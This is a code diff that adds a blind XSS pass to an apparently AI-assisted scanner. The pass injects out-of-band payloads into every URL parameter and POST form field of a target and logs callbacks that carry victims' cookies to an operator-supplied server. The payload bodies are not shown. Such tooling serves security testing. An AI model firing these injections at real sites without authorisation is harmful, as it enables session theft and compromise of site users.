@@ -24,6 +24,7 @@ import signal
 import time
 import urllib.parse
 from dataclasses import dataclass, field
+from pathlib import Path
 from typing import Any, Sequence, TYPE_CHECKING
 
 if TYPE_CHECKING:
@@ -43,6 +44,8 @@ from ai_xss_generator.console import (
 )
 
 log = logging.getLogger(__name__)
+
+_BLIND_MANIFEST_FILENAME = "blind_tokens.json"
 
 
 @dataclass
@@ -69,6 +72,7 @@ class ActiveScanConfig:
     cloud_attempts: int = 1       # recursive cloud reasoning rounds per context
     deep: bool = False
     fast: bool = False            # skip local triage, run cloud Gen XSS directly
+    blind_callback: str | None = None  # OOB callback URL for blind XSS payloads
     waf_source: str | None = None # local path to open-source WAF/filter code for planning hints
     keep_searching: bool = False
     extreme: bool = False
@@ -388,6 +392,7 @@ def run_active_scan(
                                 "findings_lock": findings_lock,
                                 "auth_headers": config.auth_headers,
                                 "sink_url": config.sink_url,
+                                "crawled_pages": crawled_pages_list,
                                 "deep": config.deep,
                                 "fast": config.fast,
                                 "waf_source": config.waf_source,
@@ -414,6 +419,7 @@ def run_active_scan(
                                 "dedup_registry": dedup_registry,
                                 "dedup_lock": dedup_lock,
                                 "auth_headers": config.auth_headers,
+                                "fast": config.fast,
                                 "waf_source": config.waf_source,
                                 "keep_searching": config.keep_searching,
                                 "extreme": config.extreme,
@@ -508,8 +514,113 @@ def run_active_scan(
                 f"Re-run with the same target to resume."
             )
 
+    # ── Blind XSS injection pass ──────────────────────────────────────────────
+    # Runs AFTER the main scan so it doesn't block reflected/stored detection.
+    # Every GET URL param and POST form field gets blind OOB payloads injected.
+    if config.blind_callback:
+        _run_blind_pass(
+            urls=url_list,
+            post_forms=post_form_list,
+            config=config,
+            report_dir=Path(config.output_path).parent if config.output_path else Path("."),
+        )
+
     _print_summary(results)
     return results
+
+
+def _run_blind_pass(
+    urls: list[str],
+    post_forms: list[Any],
+    config: "ActiveScanConfig",
+    report_dir: "Path",
+) -> None:
+    """Fire blind XSS payloads across all injection points and save token manifest."""
+    from ai_xss_generator.active.blind_xss import (
+        BlindToken, BlindTokenManifest, blind_payloads_for_context, make_token,
+    )
+    from ai_xss_generator.active.executor import ActiveExecutor
+    import urllib.parse as _up
+
+    cb = config.blind_callback
+    manifest_path = report_dir / _BLIND_MANIFEST_FILENAME
+    manifest = BlindTokenManifest(manifest_path)
+    executor = ActiveExecutor(auth_headers=config.auth_headers)
+
+    try:
+        executor.start()
+    except Exception as exc:
+        log.warning("Blind XSS: Playwright start failed: %s", exc)
+        return
+
+    injected = 0
+    try:
+        # GET URL params
+        for url in urls:
+            parsed = _up.urlparse(url)
+            params = dict(_up.parse_qsl(parsed.query, keep_blank_values=True))
+            for param_name in params:
+                token = make_token()
+                payloads = blind_payloads_for_context(token, cb, "html_text")
+                for payload in payloads[:3]:  # top 3 per param to keep it lean
+                    try:
+                        test_params = {**params, param_name: payload}
+                        new_query = _up.urlencode(test_params, quote_via=_up.quote)
+                        fire_url = _up.urlunparse(parsed._replace(query=new_query))
+                        executor.fire(
+                            url=fire_url,
+                            param_name=param_name,
+                            payload=payload,
+                            all_params=params,
+                            transform_name="blind_xss",
+                        )
+                    except Exception:
+                        pass
+                manifest.record(BlindToken(
+                    token=token, url=url, param=param_name,
+                    delivery="get", context_type="html_text", callback_url=cb,
+                ))
+                injected += 1
+
+        # POST form params
+        for pf in post_forms:
+            for param_name in getattr(pf, "param_names", []):
+                token = make_token()
+                payloads = blind_payloads_for_context(token, cb, "html_text")
+                for payload in payloads[:3]:
+                    try:
+                        executor.fire_post(
+                            source_page_url=pf.source_page_url,
+                            action_url=pf.action_url,
+                            param_name=param_name,
+                            payload=payload,
+                            all_param_names=pf.param_names,
+                            csrf_field=getattr(pf, "csrf_field", None),
+                            transform_name="blind_xss",
+                        )
+                    except Exception:
+                        pass
+                manifest.record(BlindToken(
+                    token=token, url=pf.action_url, param=param_name,
+                    delivery="post", context_type="html_text", callback_url=cb,
+                ))
+                injected += 1
+
+        if injected:
+            from ai_xss_generator.console import info as _info, success as _success
+            _success(
+                f"Blind XSS: {injected} token(s) injected — "
+                f"manifest saved to {manifest_path}"
+            )
+            _info(
+                f"Blind XSS: callbacks fire to {cb}?t=TOKEN&u=URL&c=COOKIES — "
+                f"check your OOB server or run: axss --poll-blind {manifest_path}"
+            )
+    finally:
+        try:
+            executor.stop()
+        except Exception:
+            pass
 
 
 def _log_result(r: WorkerResult) -> None:
